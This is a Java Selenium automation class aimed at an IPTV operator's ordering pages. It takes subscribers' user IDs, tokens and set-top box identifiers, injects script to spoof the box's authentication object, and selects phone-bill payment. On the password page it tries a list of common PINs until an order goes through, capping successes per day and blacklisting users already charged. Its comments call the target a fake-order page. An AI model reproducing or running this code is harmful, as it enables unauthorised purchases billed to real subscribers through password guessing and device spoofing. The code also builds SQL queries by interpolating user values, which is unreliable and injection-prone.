package com.exe.web.plugins;

import com.exe.base.Cmd;
import com.exe.base.vo.CmdVo;
import com.exe.web.util.MyConfUtil;
import kkd.common.dao.dbuitl.JDBC;
import kkd.common.dao.dbuitl.SqlParameter;
import kkd.common.util.DateUtil;
import kkd.common.util.FileUtil;
import kkd.common.util.StringUtil;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.logging.LogEntries;
import org.openqa.selenium.logging.LogEntry;
import org.openqa.selenium.logging.LogType;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.net.URLEncoder;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Types;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class OrderCqCmdBak extends Cmd{

    private final static Logger logger = LoggerFactory.getLogger(OrderCmd.class);
    //限制条数
    private int limit=10;
    //更新状态
    private boolean updateData=true;
    //截图
    private boolean cutImg=false;
    //调试
    private boolean test=false;
    //是否显示界面
    private boolean hasGui=false;
    //成功数量
    private static Map<String,Integer> successCnt=new HashMap<>();
    //每日最多成功
    private static int DAY_Max_successCnt=100;

    public void exe(CmdVo caiAction, Map<String, String> param) {
        try{
            logger.info("执行-----------------start");
            Map<String, Object> sys=cmdHandle.getSys();
            HttpServletRequest req= (HttpServletRequest) cmdHandle.getSys().get("req");
            String run=param.get("run");
            String date=DateUtil.format(new Date());
            if(StringUtil.equalsIgnoreCase(run,"false")){
                logger.info("api is-----------------stop");
                return;
            }
            Map<String,String> map=getData(req);

            if(test){
                logger.info("handle data:$map");
                WebDriver driver= getWebDriver(sys,map);
                String r=test(date,param,map,driver);
                logger.info("执行结果："+r);
                return;
            }
            Date zuoTian=DateUtil.addDays(new Date(),-30);
//            logger.info("find data create_date> $date ");
            if(overLimit(date)){
                logger.debug("date:$date,超过限制:$DAY_Max_successCnt");
                return;
            }else{
                logger.debug("date:$date,未超过限制");
            }


            logger.info("handle data:$map");
            String userId=map.get("user_id").toString();
            if(inBlack(userId)){
                logger.info("userId:$userId,黑名单中");
                map.put("description","订购失败-黑名单用户");
                update(map);
                return;
            }else{
                logger.info("userId:$userId,不在黑名单中");
            }
            //访问刷单页面两次的用户 TODO
            Integer cnt=3;
            String product_id=map.get("product_id");
            cnt=vistCnt(userId,product_id);
            if(cnt<2){
                logger.debug("userId:$userId,vistCnt:$cnt");
                return;
            }
            logger.debug("userId:$userId,start runOrder");
            WebDriver driver= getWebDriver(sys,map);
            logger.debug("get web driver:$driver");
            String r=test(date,param,map,driver);
            if(r.indexOf("success")==0){
                map.put("description","订购成功-"+r);
                logger.info("userId:"+map.get("user_id")+",订购成功-"+r);
                putBlackUser(map);
//                update(map);
            }else if(r.indexOf("exp")==0){
                map.put("description","订购异常-"+r);
                logger.info("userId:"+map.get("user_id")+",订购异常-"+r);
//                update(map);
            }else{
                logger.info("userId:"+map.get("user_id")+",订购失败-"+r);
                map.put("description","订购失败-"+r);
//                update(map);
                putBlackUser(map);
            }
        }catch (Exception e){
            logger.error("",e);
        }finally {
            if(driver!=null){
                if(!hasGui){
                    driver.quit();
                }
            }
            driver=null;
            js=null;
        }

    }

    private Map<String, String> getData(HttpServletRequest req) {
        Map<String,String> map=new HashMap<>();
        String url=req.getParameter("url");
        map.put("url",url);
        map.put("stbID",req.getParameter("stbID"));
        map.put("STBType",req.getParameter("STBType"));
        map.put("mac",req.getParameter("mac"));
        map.put("userAgent",req.getHeader("User-Agent"));

        map.put("userID",req.getParameter("userId"));
        map.put("user_id",req.getParameter("userId"));

        map.put("token",req.getParameter("token"));
        map.put("product_id",req.getParameter("product_id"));
        map.put("platform",req.getParameter("platform"));

//        if(!StringUtil.isEmpty(url)){
//            int pos=url.indexOf("?");
//            if(pos!=-1){
//                String queryString=url.substring(pos+1);
//                Map<String,String> data=StringUtil.getParaCollection(queryString,"&","=");
//                String userId=data.get("userID");
//                map.put("userID",userId);
//                map.put("user_id",userId);
//                String productID=data.get("productID");
//                map.put("product_id",productID);
//            }
//        }



        return map;
    }

    public void getCode(){

    }

    public String test(String date,Map<String, String> param,Map<String,String> map,WebDriver driver){
        try{
            System.out.println("in test");
//            driver.get("http://127.0.0.1:8080");
//            System.out.println(driver.getTitle());
//            if(true){
//                return "";
//            }
//            HttpServletRequest req=null;
//            Enumeration<String> names=req.getHeaderNames();
//            while (names.hasMoreElements()){
//                String key=names.nextElement();
//                System.out.println("headers:"+key+":"+req.getHeader(key));
//            }

            String url="http://172.0.10.52:8080/GameEpg/page/index.html";
            driver.manage().window().setSize(new Dimension(1280,720));
            System.out.println("in test 0.-1 "+driver.getCurrentUrl());
            driver.get(url);
            System.out.println("in test 0.0 "+driver.getCurrentUrl());
            driver.manage().deleteAllCookies();
            System.out.println("in test 0.1 del cookie");
            url=url+"?userID="+map.get("user_id");
            url=url+"&platform="+map.get("platform");
            url=url+"&userToken="+map.get("token");

            driver.get(url);
            System.out.println("in test 0.2 "+driver.getCurrentUrl());
            sleep(1000l);
            String url1=map.get("url");
            driver.get(url1);
            System.out.println("in test 1"+driver.getTitle());
//            System.out.println("in test 1"+driver.getPageSource());
            sleep(2000l);
//            if(true){
//                return "";
//            }
            //订购产品
            JavascriptExecutor js= (JavascriptExecutor) driver;
            js.executeScript("gotoOrder(1,1)");
            sleep(1000l);
            System.out.println("in test 2："+driver.getCurrentUrl());
            //订购失败
            if(has(driver.getCurrentUrl(),"order_lancheck.action")){
                return "order_lancheck";
            }
            //订购失败
            if(has(driver.getCurrentUrl(),"getConfig.jsp")){
                sleep(1000l);
            }

            //订购确认页
            if(has(driver.getCurrentUrl(),"order_first.action")){
                sleep(1000l);
                System.out.println("in test 3"+driver.getTitle());
                //切换到话费订购
                js.executeScript("payfocus()");
                //选择话费支付
                js.executeScript("payorder()");
//                return "order_second";
            }
            sleep(1000l);
            //输入密码页面
            if(has(driver.getCurrentUrl(),"order_intial.action")){
                List<String> pwds=new ArrayList<>();
                pwds.add("666666");
                pwds.add("123456");
                pwds.add("111111");
                pwds.add("1234");
                pwds.add("000000");
                pwds.add("1111");
                for(String pwd:pwds){
                    sleep(1000l);
                    //输入密码
//                    String jsStr=" document.getElementById(\"password\").value='" + pwd + "';";
//                    js.executeScript(jsStr);
                    WebElement passwordEle=getEle(driver,"#password");
                    passwordEle.sendKeys(pwd);
                    //设置内置变量
                    exejs(js, map.get("StbID"), map.get("STBType"), map.get("mac"));
                    //验证密码
                    js.executeScript("validatePassword()");
                    sleep(1000l);
                    System.out.println("in test 4："+driver.getTitle()+":"+driver.getCurrentUrl()+"，try pwd:$pwd");
                    //订购成功
                    if(has(driver.getCurrentUrl(),"order_second.action")){
                        System.out.println("in test 6");
                        int cnt=successCnt.get(date)+1;
                        successCnt.put(date,cnt);
                        return "success_order_second";
                    }
                    //消费密码错误页面
                    if(has(driver.getCurrentUrl(),"order_accountlock.action")){
                        js.executeScript("goback()");
                        sleep(1000l);
                        System.out.println("in test 4.1："+driver.getCurrentUrl());
//                       return "order_accountlock";
                    }

                }
                return "pwdErr";
            }
            //订购失败
            if(has(driver.getCurrentUrl(),"order_lancheck.action")){
                return "order_lancheck";
            }
            return "other_"+driver.getTitle()+":"+driver.getCurrentUrl();
        }catch (Exception e){
            logger.error("",e);
            e.printStackTrace();
            return "exp-"+e.getMessage();
        }
//        getConsoleLog();
    }


    public void exejs(JavascriptExecutor js,String StbID,String STBType,String mac){
//        function init1234(){
//            var head = document.head || document.getElementsByTagName('head')[0];
//            var script = document.createElement('script');
//            script.innerHTML = 'Authentication = new Object();Authentication.CTCGetConfig = function(cvalue){ if(cvalue=='StbID'){return '"+StbID+"'};if(cvalue=='STBType'){return '"+STBType+"'};if(cvalue=='mac'){return '"+mac+"'};}';
//            head.appendChild(script);
//        }
//        init1234();
        String jsStr="function init1234(){\n";
        jsStr=jsStr+"var head = document.head || document.getElementsByTagName('head')[0];\r\n";
        jsStr=jsStr+"var script = document.createElement('script');\r\n";
        jsStr=jsStr+"script.innerHTML = \"Authentication = new Object();Authentication.CTCGetConfig = function(cvalue){ if(cvalue=='StbID'){return '"+StbID+"'};if(cvalue=='STBType'){return '"+STBType+"'};if(cvalue=='mac'){return '"+mac+"'};}\";\r\n";
        jsStr=jsStr+"head.appendChild(script);\r\n";
        jsStr=jsStr+"}\r\n";
        jsStr=jsStr+"init1234();\r\n";
        logger.info("---------------js-content"+jsStr);
        js.executeScript(jsStr);
    }
    public boolean has(String A,String B){
        if(A.indexOf(B)!=-1){
            return true;
        }
        return false;
    }
    public void printCookie(WebDriver driver){
        Set<Cookie> sets= driver.manage().getCookies();
        Iterator it = sets.iterator();
        while (it.hasNext()) {
            Cookie cookie1 = (Cookie) it.next();
            logger.info("---------------1.cookie,"+cookie1.getName()+",val:"+cookie1.getValue());
        }
    }


    public void sleep(Long l){
        try {
            Thread.sleep(l);
        }catch (Exception e){

        }
    }
    private static int c=0;
    public void getCutImg(WebDriver driver,String name){
        try {
            if(!cutImg){
                return ;
            }
            if(c%50==0){
                c=0;
            }
            File srcFile = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
            String root=MyConfUtil.getRootPath();
            File targetFile=new File(root+"/static/logs/"+name+c+".png");
            FileUtil.copy(srcFile,targetFile);
            c++;
        } catch (Exception e) {
            logger.error("",e);
        }
    }

    private  WebDriver driver=null;
    private  JavascriptExecutor js=null;
    private static int dataIndex=0;
    private WebDriver getWebDriver(Map<String, Object> sys,Map<String,String> data){
        if(driver!=null){
            try{
                js.executeScript("console.log('test')");
            }catch (Exception e){
                logger.error("",e);
                driver=null;
            }
        }
        if(driver==null){
            System.setProperty("webdriver.gecko.driver",
                    "G:\\autoorderv2\\driver\\geckodriver.exe");
            FirefoxOptions opt = new FirefoxOptions();

//            opt.addArguments("user-data-dir=G:\\autoorderv2\\driver\\data\\"+dataIndex++);
//            opt.addArguments("disable-debugbars");
//            opt.addArguments("--no-sandbox");
            if(!hasGui){
                opt.addArguments("--headless");
            }

            //非图形化运行
//            opt.addArguments("---disable-gpu");
//            opt.addArguments("-disable-dev-shm-usage");
//            opt.addArguments("X-Requested-With:com.android.smart.terminal.iptv");
            String userAgent=data.get("User-Agent");
//            userAgent="User-Agent=111";
//            if(StringUtil.isEmpty(userAgent)){
//                userAgent="user-agent:\"webkit;Resolution(PAL,720P,1080P)\"";
//            }
            if(StringUtil.isEmpty(userAgent)) {
                try {
                    String s = URLEncoder.encode("Mozilla/5.0 (X11; Linux x86_64; Fhbw2.0) AppleWebKit/534.24 (KHTML, like Gecko) Safari/534.24 android/chromium/webkit", "utf-8");
                    s="Mozilla/5.0 (X11; Linux x86_64; Fhbw2.0) AppleWebKit/534.24 (KHTML, like Gecko) Safari/534.24 android/chromium/webkit";
//                    userAgent = "user-agent=\"" + s + "\"";
                    userAgent = s;
                } catch (Exception e) {
                }
            }else{
                try {
                    String s = URLEncoder.encode(userAgent, "utf-8");
//                    userAgent = "user-agent=\"" + userAgent + "\"";
                    userAgent = userAgent;
                } catch (Exception e) {

                }
            }

//            opt.addArguments(userAgent);
            opt.addPreference("general.useragent.override",userAgent);
            String root=MyConfUtil.getRootPath()+"/conf";
            //添加插件
//            opt.addExtensions(new File(root+"/test.crx"));
//            TODO
//            opt.setExperimentalOption("excludeSwitches",
//                    Arrays.asList("enable-automation"));

            //为了获取console的日志输出
//            DesiredCapabilities caps = DesiredCapabilities.firefox();
//            LoggingPreferences logPrefs = new LoggingPreferences();
//            logPrefs.enable(LogType.BROWSER, Level.INFO);//输入为debug的日志
//            caps.setCapability(CapabilityType.LOGGING_PREFS, logPrefs);
//            caps.setCapability(FirefoxOptions.FIREFOX_OPTIONS, opt);

            driver=new FirefoxDriver(opt);
//            driver = new ChromeDriver(caps);
//            driver = new ChromeDriver(opt);
            driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
            js = (JavascriptExecutor) driver;
            sys.put("driver",driver);
            sys.put("js",js);
        }
        return driver;
    }

    public void getConsoleLog() {
        LogEntries logEntries = driver.manage().logs().get(LogType.BROWSER);
        for (LogEntry entry : logEntries) {
            //依次打印出console信息
            System.out.println("chrome.console===="+entry.getLevel() + "：" + entry.getMessage());
        }
    }



    private void putParam(Map map, WebDriver driver) {
        String jjsp_userID= map.get("jjsp_userID").toString();
        String jjsp_userToken= map.get("jjsp_userToken").toString();
        String jjsp_key= map.get("jjsp_key").toString();
        String jjsp_platform= map.get("jjsp_platform").toString();
        String jjsp_enCodeUserID= map.get("jjsp_enCodeUserID").toString();
        String jjsp_enCodeUserToken= map.get("jjsp_enCodeUserToken").toString();
        String STBType= map.get("STBType").toString();
        String mac= map.get("STBType").toString();

        Date d=DateUtil.addDays(new Date(),999);
        logger.debug("---------------0");
        driver.manage().window().setSize(new Dimension(1280,720));
        driver.get("http://182.131.0.215:8086/CQCA/page/specialfive1.html?seriesCode=17b0f56e57b04265a54f62b9d5d01784");
        driver.manage().deleteAllCookies();
        System.out.println("---------------1");
        Cookie cookie=new Cookie("jjsp_userID",jjsp_userID,"/",d);
        driver.manage().addCookie(cookie);
        cookie=new Cookie("jjsp_userToken",jjsp_userToken,"/",d);
        driver.manage().addCookie(cookie);
        cookie=new Cookie("jjsp_key",jjsp_key,"/",d);
        driver.manage().addCookie(cookie);
        cookie=new Cookie("jjsp_platform",jjsp_platform,"/",d);
        driver.manage().addCookie(cookie);
        cookie=new Cookie("jjsp_enCodeUserID",jjsp_enCodeUserID,"/",d);
        driver.manage().addCookie(cookie);
        cookie=new Cookie("jjsp_enCodeUserToken",jjsp_enCodeUserToken,"/",d);
        driver.manage().addCookie(cookie);
        cookie=new Cookie("jjsp_index_jsp_url","http%3A//182.131.0.215%3A8086/CQCA/index.jsp","/",d);
        driver.manage().addCookie(cookie);

        Set<Cookie> sets= driver.manage().getCookies();
        Iterator it = sets.iterator();
        while (it.hasNext()) {
            Cookie cookie1 = (Cookie) it.next();
            logger.debug("---------------1.cookie,"+cookie1.getName()+",val:"+cookie1.getValue());
        }
    }

    public WebElement getEle(WebDriver driver,String cssSelector){
        try {
            return  driver.findElement(By.cssSelector(cssSelector));
        }catch (Exception e){
            return null;
        }
    }
    public String op() {
        return null;
    }


    /**
     * 获取未处理数据
     *
     * @return
     */
    public List<Map<String, String>> getNotHandle(String date) {
        JDBC.DbHelper dh = JDBC.getDefaultNoTransactionDbHelper();
        List<SqlParameter> parameters=new ArrayList<>();
        try {
            String sql="select * from iptv_order_user where description='未处理' and create_date>'$date' and id='1002' limit 1";
            sql="select * from iptv_order_user where description like '未处理' and create_date>'$date' order by id asc limit "+limit;
//            sql="select * from iptv_order_user where description like '订购成功%' and create_date>'$date' order by id desc limit "+limit;
            return dh.executeQuery(sql, parameters,
                    new JDBC.RowSetImpl<Map<String,String>>() {
                        @Override
                        public Map<String, String> getObjcet(ResultSet resultSet) {
                            Map<String,String> map=new HashMap<>();
                            try {
                                map.put("id",resultSet.getString("id"));
                                map.put("user_id",resultSet.getString("user_id"));
                                map.put("user_type",resultSet.getString("user_type"));
                                map.put("product_id",resultSet.getString("product_id"));
                                map.put("create_date",resultSet.getString("create_date"));
                                map.put("description",resultSet.getString("description"));
                                map.put("data",resultSet.getString("data"));
                            } catch (SQLException throwables) {
                                logger.error("",throwables);
                            }
                            return map;
                        }
                    });
        } catch (Exception e) {
            logger.error("",e);
        }
        return null;
    }

    /**
     是否在黑名单
     */
    public boolean inBlack(String userId){
        JDBC.DbHelper  dh=JDBC.getDefaultNoTransactionDbHelper();
        List<SqlParameter> parameters=new ArrayList<>();
        try{
            String uid=dh.executeQueryOne("select user_id from iptv_black_user where user_id='$userId' ",parameters,String.class);

            if(uid!=null){
                return true;
            }
        }catch (Exception e){
            logger.error("",e);
        }
        return false;
    }
    /**
     访问次数
     */
    public int vistCnt(String userId,String product_code){
        JDBC.DbHelper  dh=JDBC.getDefaultNoTransactionDbHelper();
        List<SqlParameter> parameters=new ArrayList<>();
        try{
            Integer cnt=dh.executeQueryOne("select count(1) from xgame_center_test2.t_user_order_req where vas_result='9314' and user_code='$userId' and product_code='$product_code' ",parameters,Integer.class);
            return cnt;
        }catch (Exception e){
            logger.error("",e);
        }
        return 0;
    }
    /**
     是否超过限制
     */
    public boolean overLimit(String date){
        Integer cnt=successCnt.get(date);
        if(cnt==null){
            successCnt.clear();
            successCnt.put(date,0);
        }
        if(cnt>DAY_Max_successCnt){
            return true;
        }
        return false;
    }

    /**
     * 更新数据
     * @return
     */
    public boolean update(Map<String,String> map){
        if(!updateData){
            return true;
        }
        JDBC.DbHelper  dh=JDBC.getDefaultNoTransactionDbHelper();
        List<SqlParameter> parameters=new ArrayList<>();
        try{
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("user_id")));
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("user_type")));
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("product_id")));
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("create_date")));
            String desc=map.get("description");
            if(desc!=null&&desc.length()>50){
                desc=desc.substring(0,40);
            }
            parameters.add(new SqlParameter(Types.VARCHAR,desc));

            parameters.add(new SqlParameter(Types.VARCHAR,map.get("id")));
            String sql="update iptv_order_user set user_id=?,user_type=?,product_id=?,create_date=?,description=? where id=?";
            int cnt=dh.executeUpdate(sql,parameters);
            if(cnt>0){
                logger.debug("更新用户：$map.user_id 成功");
                return true;
            }
        }catch (Exception e){
            logger.error("",e);
        }
        return false;
    }

    /**
     * 删除数据
     * @return
     */
    public boolean delLog(Map<String,String> map){
        Date create_date=new Date();

        JDBC.DbHelper  dh=JDBC.getDefaultNoTransactionDbHelper();
        List<SqlParameter> parameters=new ArrayList<>();
        try{
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("id")));
            String sql="delete from  iptv_order_user where id=?";
            int cnt=dh.executeUpdate(sql,parameters);
            if(cnt>0){
                logger.debug("删除用户：$user_id 历史");
                return true;
            }
        }catch (Exception e){
            logger.error("",e);
        }
        return false;
    }

    public boolean putBlackUser(Map<String,String> map){
        if(!updateData){
            return true;
        }
        Date create_date=new Date();

        JDBC.DbHelper dh=JDBC.getDefaultNoTransactionDbHelper();
        List<SqlParameter> parameters=new ArrayList<>();
        try{
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("user_id")));
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("user_type")));
            parameters.add(new SqlParameter(Types.VARCHAR,map.get("product_id")));
            parameters.add(new SqlParameter(Types.TIMESTAMP,create_date));
            String desc=map.get("description");
            if(desc!=null&& desc.length()>50){
                desc=desc.substring(0,40);
            }
            parameters.add(new SqlParameter(Types.VARCHAR,desc));
            String sql="insert into iptv_black_user(user_id,user_type,product_id,create_date,description)values";
            sql=sql+"(?,?,?,?,?)";
            int cnt=dh.executeUpdate(sql,parameters);
            if(cnt>0){
                logger.debug("插入黑名单用户：$map.user_id ");
                return true;
            }
        }catch (Exception e){
//            e.printStackTrace();
        }
        return false;
    }

}